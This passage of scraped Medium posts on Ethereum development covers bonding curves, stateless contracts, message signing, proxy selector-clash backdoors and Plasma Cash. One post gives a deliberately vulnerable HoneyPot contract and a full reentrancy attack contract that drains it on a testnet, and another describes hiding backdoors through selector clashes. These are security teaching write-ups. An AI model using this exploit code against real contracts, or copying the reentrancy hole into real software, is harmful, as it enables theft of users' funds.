they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 5, "tags": ["Blockchain", "Solidity", "Programming", "Ethereum", "Bitcoin"]}, {"title": "How to Make Bonding Curves for Continuous Token Models", "post_link": "https://blog.relevant.community/how-to-make-bonding-curves-for-continuous-token-models-3784653f8b17?source=search_post", "author_name": "Slava Balasanov", "author_link": "https://blog.relevant.community/@balasan", "publish_date": "2018-02-06", "last_modified_date": "2018-12-13", "readtime": "8.33", "claps": 1787, "voters": 220, "content": "How to Make Bonding Curves for Continuous Token ModelsSlava BalasanovFollowFeb 6, 2018 \u00b7 9 min readThis is a technical primer on how to make your own bonding curves, followed by a discussion about the opportunities and risks involved. If you\u2019re not interested in the tech, skip to the end for some general insights. If you just want some code samples in solidity, the reference github repo is here:relevant-community/contractscontracts - Relevant Bonding Curve and Token Contractsgithub.comWhat are Bonding Curves?There has recently been a lot of renewed excitement about ideas behind curation markets, a term coined by Simon de la Rouviere:The core, functional components of curation markets involve:A token that can be minted at any time (continuous) according to a price set by the smart contract.This price gets more expensive as more tokens are in circulation.The amount paid for the token is kept in a communal deposit.At any point in time, a token can be withdrawn (\u201cburned\u201d) from the active supply, and a proportional part of the communal deposit can be taken with.The tokens are used to bond it to curators per sub-topic, who then curate information with their proportional backing.tweet via Fred EhrsamIn curation markets, tokens are bought and sold according to a \u201cbonding curve\u201d \u2014 an equation that defines the token price as a function of token supply.Here is an example of a quadratic bonding curve:currentPrice = tokenSupply\u00b2When a user wants to buy 10 tokens, the contract mints 10 new tokens, computes their price and sends those tokens to the user in exchange for Ether (or another reserve token).But computing how much we should charge for the 10 new tokens isn\u2019t trivial. One might think it should be 10 * currentPrice, but that\u2019s not correct because creating each new token increases the price, so the user must pay a little more than the currentPrice for each subsequent token.A naive approach might be to iterate over the new tokens and update the price at each iteration. However this is very inefficient and also inaccurate, because even the smallest change in token supply (like .1 tokens) will move the price.What we want to do is compute the sum of all the infinitely small changes in price. This is the same as computing the area under the bonding curve \u2014 we can easily do this using integrals.For example, to compute the total Ether (poolBalance) held by our quadratic bonding curve contract we compute the integral of the price function:poolBalance = 1/3 * tokenSupply\u00b3This is the same as the area under our curve between 0 and tokenSupply:From this we can derive how much we should charge for 10 new tokens:priceForTokens = 1/3* (tokenSupply + 10)\u00b3 \u2014 poolBalanceUsing this method we can compute formulas for bonding curves based on any power function y=x^p. The sample code includes cases for y=m * x\u00b2, y=m * x and y = m * sqrt(x)Bancor FormulaHowever we can do better. Remember Bancor? The ICO that raised $153M last summer with 40 lines of code? Well, that code is for computing a general type of bonding curve.A nice property of power functions is that we can define our bonding curve in terms of a reserve ratio. Reserve ratio is defined by the relationship between token price, token supply and poolBalance.reserveRatio = poolBalance / (currentPrice * tokenSupply)In our y=x\u00b2 function, poolBalance = 1/3 * tokenSupply\u00b3, so we can rewrite the reserve ratio formula:reserveRatio = 1/3 * tokenSupply\u00b3 / (tokenSupply\u00b2 * tokenSupply) = 1 / 3So we can express our quadratic curve as a token with reserve ratio of 1/3. Similarly, y=x is a curve with a reserveRatio of \u00bd and y=sqrt(x) is a curve with a reserveRatio of \u2154.Bancor\u2019s formula allows us to compute token prices for arbitrary curves with reserve ratios between 0 -100%, (you can read more details about in their white paper). In fact their own BNT token can be bought and sold via a smart contract with a 1/10 reserve ratio.Here is their solidity implementation with some fancy tricks to compute fractional exponents of fractions:bancorprotocol/contractscontracts - Bancor Protocol Contractsgithub.comHere is an implementation of a simple universal bonding curve I put together using the Bancor formula:relevant-community/contractscontracts - Relevant Bonding Curve and Token Contractsgithub.comThe gas prices to buy and sell the token are slightly higher than the specific cases, but still very reasonable.ImplicationsBonding Curves allow us to create some cool token models.LiquidityThe obvious advantage is instant liquidity \u2014 you can create a contract and have anyone be able to buy and sell your token right away.Bid-Ask Spreads & Dynamic Inflation RateSince the contract functions as a market maker, you can define your own bid-ask spread and charge a small premium when users buy or sell tokens and generate income from providing liquidity. This is also a way to mitigate pump-n-dump attacks while the token is its nascency \u2014 attack will be less profitable if we use a sell curve with a lower reserve ratio.What is even more interesting, is that you can define separate (even dynamically computed) buy and sell curves. Again, these function as dynamic bid-ask spreads and allow you to allocate the proceeds however you like.At Relevant we plan on using a bid-ask spread in order to create an inflationary token with a dynamically calculated inflation rate. The newly minted tokens will be used to reward users for curating quality news feeds.Example of a token with a dynamic inflation rate:Initialization:maxInflationRate = 10%startRatio = 20%minReserveRatio = 10%As above, our reserve ratio is:reserveRatio = poolBalance / (totalSupply * tokenPrice)but it is now dynamic since the total supply increases with inflation.Our \u2018buy\u2019 curve is based on a 20% startRatio and our \u2018sell\u2019 curve is dynamically calculated from the actual reserve ratio but is not allowed to fall below 10%.red = sell curve, yellow = buy curveWe start with both curves based on a 20% reserve ratio, but as time passes, we mint new tokens based on inflation rate. As a result, our supply increases but poolBalance stays the same. This starts pushing the sell curve closer to the 10% ratio. As this happens, we adjust our inflation rate to equal 20% \u2014 reserveRatio. As the reserveRatio gets closer to a 10% ratio, inflation goes to 0%. However if there is a lot of demand for the token, and people are buying based on the 20% curve, the reserveRatio moves up closer to 20% and inflation increases toward the max 10% rate.Eventually exchanges will be able to offer a more competitive bid-ask spread than our contract. Once our token becomes liquid enough to be traded on exchanges, the majority of trading will start happening there, with a price somewhere in between the bid-ask spread offered by the contract. Once the exchange price moves above or below the buy/sell curves, the contract will present an arbitrage opportunity, adjust the inflation rate and mint or burn tokens as needed to match the exchange prices.Bonding Curve and ICOsYou can do an ICO with a bonding curve token. Bancor ICO is one such example. They used 20% of the funds raised in their ICO to initialize a 10% bonding curve token contract. Half of the total supply of the tokens was distributed to ICO contributors and half to the founders. As a result the 10% of the total market cap of the tokens was backed by Ether.Bancor token sale, however was far from exemplary and much closer in design to a vanilla incapped ICO. The main novelty was immediate token liquidity and dynamic token supply.A more novel approach would be to launch your token and have it be liquid before conducting an ICO \u2014 this dynamic is particularly great for testing market demand for utility tokens before doing a sale.Here is how you do it:Create a bonding curve with your desired reserveRatio, for example 20%.At token launch, allocate an icoFund \u2014 amount of tokens controlled by the contract owner, not backed by Ether and not tradable via the contract.Let users buy and sell tokens based on a curve that takes icoFund into account (totalSupply = tradableTokens + icoFund). The calculation assumes the icoFund tokens are backed by assets even though they are not, however this is fine because the tokens in the icoFund are not tradable.Announce the ICO start time and set price at current token price \u2014 this will create an automatic cap = currentPrice * tokens in icoFund.When participants send Ether to the ICO contract, deposit 20% of the balance into the token contract poolBalance, convert an appropriate amount of icoFund tokens into regular tokens and send them to the participants.Creating separate buy-sell curves and making it less profitable to sell tokens right away can also limit pump and dump risks.This model can still be abused to defraud investors, however if set up correctly and with full transparency, it can offer protection from pump-n-dump manipulation and abuse by founders.Intra-Network \u201clocal-tokens\u201dAs both Chris Burniske and Simon de la Rouviere propose, local bonding curve tokens can be used within a tokenized platform to incentivise users to create sub communities or curate sub topics via a Token Curated Registries.Continuous Token-Curated Registries: The Infinity of Lists\u201cToken-curated registries are decentrally-curated lists with intrinsic economic incentives for token holders to curate\u2026medium.comAttack Vectors & SecurityFront-running AttackBonding curves are susceptible to front-running attacks. This is when an adversary watches for a big buy order coming in and sends her own buy order with more gas to cut ahead of the original order. Once the original order is executed, the attacker sells her tokens at a guaranteed profit. You can read more about this exploit in the Bancor protocol here:Implementing Ethereum trading front-runs on the Bancor exchange in PythonThis post is a deep-dive into programmatically trading on the Ethereum / Bancor exchange and exploiting a\u2026hackernoon.comBancor\u2019s proposed solution is to set a limit on gas price buyers and sellers can submit and encourage everyone to use the maximum allowed gas price when sending their orders. This prevents the adversary from having their order executed ahead of the already-submitted orders.Another, less effective fix is to ask users to submit a minimum token amount they would like to buy. This way if the price has increased after the order was submitted, it won\u2019t execute unless the contract is able mint the minimum amount.Deep-Nested Bonding Curves Increase RiskIn the case where we have several layers of child tokens, each with their own bonding curve the risks are compounded.Lets say Alice creates a platform token with a 10% reserve ratio backed by Ether. She lets users create an arbitrary amount of child tokens, each with their own children and bonding curves.Bob creates his own token with a 50% reserve ratio backed by Alice\u2019s token. Bob\u2019s token\u2019s price is now backed by only .1 * .5 = 5% of Ether.Carol creates a token with a 20% reserve of Bob\u2019s token. Carol\u2019s token is now only backed by .1 * .5 * .2 = 1% of Ether and will be extremely volatile.Platforms will need to figure out ways to limit these scenarios and make the risks transparent to the users. One solution is to limit nesting reserve ratio so that they don\u2019t exceed a minimum compounded reserve ratio.If you want to dive deeper into bonding curve math and parametrizaion, check out this follow up post:Bonding Curves In Depth: Intuition & ParametrizationThis post is an in-depth exploration of bonding curves and is loosely based on a talk and workshop I gave at the 2nd\u2026blog.relevant.communityIf you want to know more about our project, Relevant, sign up for the closed beta, and get in touch via Slack or Twitter.Follow me on Twitter for more token engineering content \u270c\ufe0f.", "responses": 8, "tags": ["Blockchain", "Bonding Curves", "Continuous Token Models", "Solidity", "Code Samples"]}, {"title": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract", "post_link": "https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4?source=search_post", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-05-25", "last_modified_date": "2018-06-19", "readtime": "3.58", "claps": 1269, "voters": 199, "content": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack ContractGustavo (Gus) GuimaraesFollowMay 25, 2017 \u00b7 4 min readTo code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not only your money but also other people\u2019s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one need to be always updated and akin to smart contract security best practices.As a student of smart contract security, I have been on the look out for vulnerabilities in code. Recently the educators at Team B9lab informed me of this contract deployed to the testnet.pragma solidity ^0.4.8;contract HoneyPot {  mapping (address => uint) public balances;  function HoneyPot() payable {    put();  }  function put() payable {    balances[msg.sender] = msg.value;  }  function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }  function() {    throw;  }}The HoneyPot contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post I want to share with you how I attacked this contract and \u2018collected\u2019 most of its ether.The Vulnerable ContractThe purpose of the HoneyPot contract above is to keep a record of balances for each address that put() ether in it and allow these addresses to get() them later.Let\u2019s look at the most interesting parts of this contract:mapping (address => uint) public balances;The code above maps addresses to a value and store it in a public variable called balances . It allows to check the HoneyPot balance for a address.balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]The put() function below is where the storage of the ether value happens in the contract. Note that msg.sender here is the address from the sender of the transaction.function put() payable {    balances[msg.sender] = msg.value;  }This next function we find where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in the HoneyPot balances.function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }Where is the exploitable and how can someone attack this you ask? Check again these lines of code out:if (!msg.sender.call.value(balances[msg.sender])()) {      throw;}balances[msg.sender] = 0;HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to msg.sender goes through.What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.Let\u2019s create one.Here is the full contract code. I will attempt my best to explain its parts.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;  function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);  }  function kill () {    suicide(msg.sender);  }  function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }  function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }}The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the HoneyPot contract which I put in a separate file. Note that HoneyPot is referenced throughout the HoneyPotCollect contract. And we set up the contract base which we call it HoneyPotCollect .pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;...}Then we define the constructor function. This is the function that is called when HoneyPotCollect is created. Note that we pass an address to this function. This address will be the HoneyPot contract address.function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);}Next function is a kill function. I want to withdraw ether from the HoneyPot contract to the HoneyPotCollect contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address that calls the kill function.function kill () {  suicide(msg.sender);}The following function is the one that will set the reentrancy attack in motion. It puts some ether in HoneyPot and right after it gets it.function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.The last function is what is known as the fallback function. This unnamed function is called whenever the HoneyPotCollect contract receives ether.function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }This is where the reentrancy attack occur. Let\u2019s see how.The AttackAfter deploying HoneyPotCollect, call collect() and sending with it some ether.HoneyPot get() function sends ether to the address that called it only if this contract has any ether as balance. When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered. If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get() function once again and the cycle repeats.Recall that within the get()function the code that sets the balance to zero comes only after sending the transaction. This tricks the HoneyPot contract into sending money to the HoneyPotCollect address over and over and over until HoneyPot is depleted of almost all its ether.Try it yourself. I left 1 test ether in this contract so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.I originally created this code for the HoneyPotAttackusing the Truffle framework. Here is the code in case you need it for reference. Enjoy!", "responses": 9, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Reentrancy Attack", "Smart Contract Security"]}, {"title": "Stateless Smart Contracts", "post_link": "https://medium.com/@childsmaidment/stateless-smart-contracts-21830b0cd1b6?source=search_post", "author_name": "James Childs-Maidment", "author_link": "https://medium.com/@childsmaidment", "publish_date": "2017-08-17", "last_modified_date": "2018-06-20", "readtime": "3.23", "claps": 1074, "voters": 193, "content": "Stateless Smart ContractsJames Childs-MaidmentFollowAug 17, 2017 \u00b7 4 min readThe stateless smart contract or dumb contract is a design pattern used to drastically reduce the gas cost of Ethereum smart contracts.A stateless design comes in two parts:The Dumb ContractThe FilterDumb ContractHere is how you might write a standard datastore contract:contract DataStore {    mapping(address => mapping(bytes32 => string)) public store;        event Save(address indexed from, bytes32 indexed key, string value);        function save(bytes32 key, string value) {        store[msg.sender][key] = value;        Save(msg.sender, key, value);    }}Let\u2019s say we want to save the following key / value pair using the contract above:key: \u201cethereum\u201dvalue: \u201cEthereum is a decentralized platform that runs smart contracts: applications that run exactly as programmed without any possibility of downtime, censorship, fraud or third party interference.\u201dThis transaction will cost 181,181 gas (or 89,797 gas if we use IPFS).If we follow a stateless design our contract would look like this:contract DataStore {    function save(bytes32 key, string value) {}}That\u2019s it. We don\u2019t store any contract state and we don\u2019t fire off events. We implement the rest of the logic off-chain. If we use the same data as above the transaction costs 35,721 gas (or 25,841 gas if we use IPFS) which is an 80% reduction in gas cost.So if we aren\u2019t saving any contract state how do we access our data?Take a look at this transaction on Etherscan, scroll down to Input Data, and click the Convert To Ascii button. Our data lives in the input of the transaction.FilterA Filter processes the transactions of a dumb contract and provides an interpretation of that data.In a standard dapp we would interact with a smart contract like this:Frontend => Web3 => Ethereum Network => Web3 => FrontendIn a stateless design we do the following:Frontend => Web3 => Ethereum Network => Backend => FrontendWhen a user interacts with our dumb contract from the frontend (using something like MetaMask) we watch for incoming transactions on the backend and process them.For example, using the information in the transaction above, we can implement the logic from the standard version of the datastore contract off-chain.We can use InputDataDecoder to recover information from the transaction inputs:const abi = [  {    constant: false,    inputs: [      { name: \"key\", type: \"bytes32\" },      { name: \"value\", type: \"string\" }    ],    name: \"save\",    outputs: [],    payable: false,    type: \"function\"  }];const decoder = new InputDataDecoder(abi);const decodeInput = input => decoder.decodeData(input);We need to do a little extra processing to recover our bytes32 key arg:const processArgs = input =>  input.inputs.map((arg, i) => {    const type = input.types[i];    if (type === \"string\") {      return arg;    }    if (type === \"bytes32\") {      const toHex = `0x${arg.toString(\"hex\")}`;      return web3.toUtf8(toHex);    }    return arg;  });Tying it all together:const run = async () => {  const tx = \"0xc9fdf51d...\";  const transaction = await web3.eth.getTransaction(tx);  const input = decodeInput(transaction.input);  if (input.name === \"save\") {    const args = processArgs(input);    const address = transaction.from;    const key = args[0];    const value = args[1];    // save the address / key / value to a database  }};We can now save the key / value under the address that the transaction was sent from in a database that provides a better user experience.Extras DetailsYou can apply various levels of statelessness to your contract depending on your needs. For example, you can store usernames in a registry to enable other smart contracts to identify users.function registerUsername(bytes32 username) external {        var hasUsername = usernames[msg.sender];        var isOwned = addresses[username];        if (isOwned != 0) throw; // prevents registration of existing username        if (hasUsername != 0) throw; // prevents registered address from registering another username        if (!isLowercase(username)) throw; // username must be lowercase        usernames[msg.sender] = username;        addresses[username] = msg.sender;    }Meanwhile, you can keep other content completely stateless.function post(string data) external {  var username = usernames[msg.sender];  if (username == 0) throw; // user must be registered}TamperingUsers can easily validate whether or not a Filter provider is tampering with content by looking at the inputs of transactions on the blockchain.However, tampering can be positive! A Filter can enhance stateless content with metadata, media, links, and handles.One of the great things about dumb contracts is that anyone can build a Filter on top of one and provide their own interpretation of the data. If you are worried about censorship you can also open source your Filter to allow others to spin up your interpretation.Trade-OffsA stateless design is only useful for certain types of projects. Keep these trade-offs in mind:A stateless design requires a mix of decentralization and centralization to provide the best user experience / gas cost.Other contracts cannot access your data.If your contract has no events you must processes every block to find relevant transactions. This can be mitigated by firing off empty events with marginal extra gas costs.That\u2019s it, I hope you found this educational!A fantastic decentralized social media product now exists that builds on top of the ideas presented in this article: Peepeth.", "responses": 12, "tags": ["Ethereum", "Smart Contracts", "Solidity", "JavaScript", "Decentralization"]}, {"title": "Ethereum: Signing and Validating", "post_link": "https://medium.com/@angellopozo/ethereum-signing-and-validating-13a2d7cb0ee3?source=search_post", "author_name": "Angello Pozo", "author_link": "https://medium.com/@angellopozo", "publish_date": "2017-06-09", "last_modified_date": "2018-06-18", "readtime": "3.96", "claps": 1156, "voters": 179, "content": "Ethereum: Signing and ValidatingAngello PozoFollowJun 9, 2017 \u00b7 4 min readA core primitive of Ethereum and other cryptocurrencies is the ability to sign data that can be verified by anyone. This powers the distributed nature of blockchain. In Bitcoin you sign a transaction saying you want to give Sally 4 bitcoin. Without this property, anyone could make fake transactions giving themselves all coins.TL;DR;If you go to ecrecover-example on github for the full codebase. Simply follow the instructions in the README.md and see the results in the command line.What is Signing?Signing is the act of a user A \u201csigning\u201d data that anyone can validate came from user A. This is used in transactions to check if they are real.A common question is \u201chow can you validate transactions are real?\u201d The short answer is public-key cryptography. It\u2019s an algorithm with 3 parts.Key CreationEncryption/SigningDecryption/ValidationEncryption is generally used to hide data in other data. If you encrypt a string like \u2018hello world\u2019 you get something like `dqE3gJz/+5CQHfSJwMP2nQ`. Its purpose is to hide the message \u2018hello world\u2019. Signing is used to create a different output string, but you also publicize the original message.The key creation will output two strings, a public and private key. It links them through an algorithm that has the signing and validation properties. A signature will take in a public key, private key, and message. The output will be another string that is the signature.Signature = F(public key, private key, message)Validation = F(Signature, message)Is Valid if: Validation = public keyNotice how validation does not require knowledge of the private key. This is what allows 3rd parties to validate information. If the output of the validation function is equal to the public key then the signature is real, otherwise its fake.The signature is made up of 3 variables: v, r, s. Ethereum employs Elliptic curve cryptography and those variables are simply part of the underlying math.Why Sign?Signing is a nice way to know something is being done by the correct person/contract. This means we can trust that someone is actually doing what they say they are.Instead of real world signatures, which can be faked, the digital ones can not. If you want to know user A did something, make them sign it before moving forward. Then if a dispute arrises, check the signature.Development:As a developer you want your users to sign a message. There are 3 parts to creating this feature in your respective DApp (Distributed Application).Solidity validator functionClient code to sign a messageClient code to call Solidity validatorSolidity Validator:Solidity provides a globally available method ecrecover that returns an address. If the return address is the same as the signer, then the signature is real.Solidity Verifier.solThe code above creates a Verifier contract with the recoverAddr and isSigned functions. The latter will return an address. Requiring you as a developer to validate, outside of Solidity, that the address is correct. The second method, isSigned does the check within Solidity. isSigned will return true or false if the msgHash is signed by _addr.Creating Signature:There are two ways to create a signature:Using Web3\u2019s Javascript function web3.eth.signCalling the RPC API of an Ethereum nodeIf you are using Javascript then all you have to do is requireweb3 and attach to an Ethereum node. In the code below, I am running a private Ethereum node bound tolocalhost:8545. NOTE: THIS WILL NOT WORK ON TESTRPCGenerate an Ethereum signatureThere is no built in function to convert a string to hex. So I used the function toHex to do the conversion. The users address (web3.eth.accounts[0]) and message with the 0x prefixed are passed into the web3.eth.sign function.Another way to create a signature is to call the Ethereum RPC API. With curl you should be able to make a request to an Ethereum node.Call Ethereum RPC api eth_signThe first parameter in params is the users address, and the second is the hex value of the message. Note for the RPC api to work your account must be unlocked. You will get something like the following back:0x9955af11969a2d2a7f860cb00e6a00cfa7c581f5df2dbe8ea16700b33f4b4b9b69f945012f7ea7d3febf11eb1b78e1adc2d1c14c2cf48b25000938cc1860c83e01The long signature encodes the previously mentioned v, r, s variables. To extract these values, you need to parse the signature into substrings.Parsing out r, s, and v from the signatureNOTE: v must be a decimal number, hence the second v_decimal that turns hex v into decimal v.DANGER: The resulting v_decimal must be either 27 or 28!Checking if Correct:With the validator and signing completed, all that is left is to actually check if the signature is real. There is one teeny tiny caveat. Remember when creating the signature we used the string0x + toHex(msg). Well that is not the same hash that you pass into the validator!Again, the hash to creating the signature is not the same for the validator. The reason is to protect the user from signing arbitrary payloads.The solution is to add a custom Ethereum message, and length.//FOR SIGNATURE Hex:I really did make this message//FOR VALIDATOR sha3:\\x19Ethereum Signed Message:\\n30I really did make this messageThis distinction is VERY necessary! Do not waste your time following any other steps.The last step is to somehow call your Solidity code. I am using Truffle 3 to deploy the previous smart contract. Please note the location of the Ethereum node must be declared (localhost:8545) for the contract. Otherwise it will not work as expected.Validate signature is validTruffle creates a deployed function that returns the contract instance. I create my sha3 message and pass the required variables into instance.verify.call. If the addresses returned by the last two lines are the same then the owner really did sign the message. Otherwise its a forgery that can be ignored.Conclusion:Signing data can be important for any kinds of DApp. Some obvious applications are rights management, copyright, patent ownership. Users could sign those files and anyone can validate that they did in fact make those things. What use case can you think of?", "responses": 21, "tags": ["Blockchain", "Ethereum", "Solidity", "Smart Contracts", "Truffle"]}, {"title": "Malicious backdoors in Ethereum Proxies", "post_link": "https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357?source=search_post", "author_name": "Patricio Palladino", "author_link": "https://medium.com/@alcuadrado", "publish_date": "2018-06-01", "last_modified_date": "2018-09-07", "readtime": "4.86", "claps": 1500, "voters": 177, "content": "Malicious backdoors in Ethereum ProxiesA detailed explanation on how the Proxy pattern for smart contract upgradeability can be exploited.Patricio PalladinoFollowJun 1, 2018 \u00b7 5 min readWe recently audited the initial release of ZeppelinOS and discovered a vulnerability in the Proxy Pattern, which is used to implement virtually all upgradeable smart contracts.This vulnerability lets an attacker conceal malicious code that can be very difficult to spot without a deep understanding of how Solidity and the Proxy Pattern work. This has already been fixed on ZeppelinOS.Solidity function calls\u2019 internalsA simple smart contract written in SolidityIf you are a developer building for Ethereum you most likely code and think about your smart contracts in terms of Solidity, but that\u2019s not how the network works with them.From the network\u2019s perspective, a smart contract is an account with a single chunk of code associated to it. If any other account sends a message\u00b9 to the contract, its code will be executed on the EVM.So how is it possible to call different functions if the contract only has one piece of consecutive code?Ethereum defines a standard way of communicating between its components, which is the Application Binary Interface, or ABI for short. You can think of it as a low-level API, specifying not only which features are available in the system, but also how many things that we normally take for granted work. Some of these things are how functions should be called, how to pass them arguments, and how they return values.The Ethereum ABI dictates that the data parameter of your transaction must start with a function selector, which identifies which method you are trying to call. Using the selector your contract\u2019s code jumps to the portion of itself that implements the function you\u2019re trying to call.Function selectors are just the first four bytes of thesha3 hash of the function\u2019s signature. For example, the get\u2019s selector is computed as sha3(\u201cget()\u201d)[0:4], which gives us 0x6d4ce63c. Similarly, set's one is the result of sha3(\u201cset(uint256)\u201d)[0:4].There is only one exception to function selectors and that\u2019s for the fallback function present in every smart contract, which doesn\u2019t have a selector. It has the special behavior of being called when no data parameter is provided, or when the given selector doesn\u2019t match any of the contract\u2019s methods.The Proxy Pattern revisitedMuch has been written about the Proxy Pattern, its different variations and their trade-offs. Regardless of the proxy pattern you choose, its core functionality will be the same: it forwards\u00b2 all messages it receives to the current implementation of the contract.Let\u2019s take a look at how this works.A proxy contract implementationDon\u2019t worry, you don\u2019t need to understand how that scary assembly block works. It forwards the current message to the implementation, sending it the exact same dataparameter it received.Placing the forwarding logic in the fallback function allows us to forward any call into Proxy, supposedly. Turns out, this doesn\u2019t quite always happen.The Proxy also needs its own meta-functionality, as it needs to be upgradeable. So functions like implementation() and proxyOwner() won\u2019t be forwarded, given that they exist and the fallback function isn\u2019t executed.Proxy selector clashingBeing a clever Ethereum dev, you may have realized that any function in the Proxy contract whose selector matches with one in the implementation contract will be called directly, completely skipping the implementation code.Because the function selectors use a fixed amount of bytes, there will always be the possibility of a clash. This isn\u2019t an issue for day to day development, given that the Solidity compiler will detect a selector clash within a contract, but this becomes exploitable when selectors are used for cross-contract interaction. Clashes can be abused to create a seemingly well-behaved contract that\u2019s actually concealing a backdoor.Armed with some rust code, we found that clash550254402() has the same selector as proxyOwner(). It took less than 15 minutes to find it in a newish Macbook Pro. A motivated hacker can optimize the process and dedicate much more resources to finding discrete-looking function names.ExploitabilityThe Proxy pattern is the current approach being used across the Ethereum ecosystem to make smart contracts upgradeable, and the selector clashing attack allows any project using it \u2014 or an attacker who\u2019s obtained access to the upgrading mechanism \u2014 to deploy code that conceals malicious functionality.For example, most upgradability implementations have some notion of state migrations, which are functions that upgrade the contract\u2019s storage. These are especially useful to disguise a selector clash given that auto-generated strings, like commit numbers, can be acceptable names for those functions, making a selector clash attack easy to disguise.In the context of the security audit we conducted on ZeppelinOS, we found that this could be exploited by anyone and not just the Proxy owner, given that they intend to let any user of the network deploy implementations for other users to use. As another example, a function call that seems to move funds as it should may actually not be called at all, stealing someone\u2019s money.Proposed solutionBefore we found this vulnerability, Francisco Giordano from Zeppelin was already working on Transparent Proxies. It is an improved technique intended to let implementation contracts use the same function names as the Proxy without the possibility of a selector clash. This eliminates the attack.These new proxies work by forwarding any call as long as they don\u2019t come from the Proxy owner. Clashes still exist, but if the caller is anyone other than the Proxy owner, the call is forwarded. This makes the Proxy owner the only account that can fall into a clash, hence users not exposed to concealment.The only drawback is that other users won\u2019t be able to read the Proxy's own state (i.e. owner and implementation) using its ABI. They will need to use web3.eth.getStorageAt() instead. This is a reasonably small price to pay for being certain that upgradable contracts do exactly what their implementation source code shows.Exercise for the readerFor those who want to dig deeper in how this vulnerability can be exploited, we put together a small exercise. Your task is to try to steal the ropsten-ETH in this contract, and figure out what\u2019s happening. Keep in mind that it is a Proxy contract, so you should take a look at its implementation too.You can do whatever you want with those contracts, just don\u2019t fully empty its balance so other people can also play.NotesMessages are how accounts communicate with each other. When you send a transaction, you are sending a message to another account. They are usually called internal transactions when the sender is a contract.Messages are not actually forwarded like in a traditional proxy. What\u2019s happening is that we execute the implementation\u2019s code as if it were the proxy\u2019s via a delegatecall.Get a high-quality smart contract audit from Nomic Labs.", "responses": 5, "tags": ["Ethereum", "Security", "Solidity", "Blockchain", "Articles"]}, {"title": "Plasma Cash Initial Release \u2014 Plasma-Backed NFTs Now Available on Loom Network Sidechains", "post_link": "https://medium.com/loom-network/plasma-cash-initial-release-plasma-backed-nfts-now-available-on-loom-network-sidechains-37976d0cfccd?source=search_post", "author_name": "Matthew Campbell", "author_link": "https://medium.com/@kanwisher", "publish_date": "2018-06-29", "last_modified_date": "2019-08-19", "readtime": "6.50", "claps": 3419, "voters": 176, "content": "Plasma Cash Initial Release \u2014 Plasma-Backed NFTs Now Available on Loom Network Sidechainsby Matthew Campbell and Georgios KonstantopoulosMatthew CampbellFollowJun 29, 2018 \u00b7 7 min readArticles in this series:Plasma on Loom Network DAppChains: Scalable DApps With Ethereum-Secured AssetsPractical Plasma (Volume I): GamingPlasma Cash Initial Release \u2014 Plasma-Backed NFTs Now Available on Loom Network Sidechains \ud83d\udc48Two months ago, we announced that we were adding Plasma Cash to Loom Network.Today, we\u2019re proud to release our initial implementation of Plasma Cash, which allows the use of ERC721 non-fungible tokens on Loom sidechains.That means users will now be able to have gas-less transactions and sub-second confirmation times on sidechains, all while having their token fully backed by the security of Ethereum mainnet.Plasma Cash Smart Contracts Now Open SourceDevelopers, you can find the source code for our implementation on our github:https://github.com/loomnetwork/plasma-erc721We\u2019ve also announced our release on ethresear.ch for public auditing by the Plasma community.We look forward to future contributions from other developers and projects building on top of our initial code release.Current Implementation and Next StepsSince our initial focus at Loom Network is building blockchain games like Zombie Battleground, our initial implementation of Plasma Cash is specifically for ERC721 non-fungible tokens.Porting the code to handle ETH, ERC20s, and other types of tokens is fairly trivial, but will require more comprehensive tests.For our purposes, being able to utilize Plasma Cash for non-fungible tokens like ERC721s opens up a number of important use cases in gaming. Thus, this was the very first use case we chose to tackle.Next Steps \u2014 Token Splitting and MergingOur next steps are to add support for ERC20 tokens and ETH.Research is still ongoing on efficient constructions for token splitting and merging on the Plasma chain, and currently no clear consensus has been reached on the best way to move forward with this. A research construction called Plasma Debit aims to partially solve this issueWe will be actively collaborating with the Plasma research team over the coming months to find the best way to work with token splitting on Plasma chains.Last week our lead Plasma researcher, Georgios Konstantopoulos, joined Joseph Poon, Karl Floresch, et al. on the official Plasma Implementer\u2019s Call:Georgios Konstantopoulos (in that tiny box on the top left), our lead Plasma researcher, on the Plasma Implementers Call last weekUntil there is consensus on how to handle token splits and merges on the Plasma chain, Loom SDK developers will still be able to use the Loom Transfer 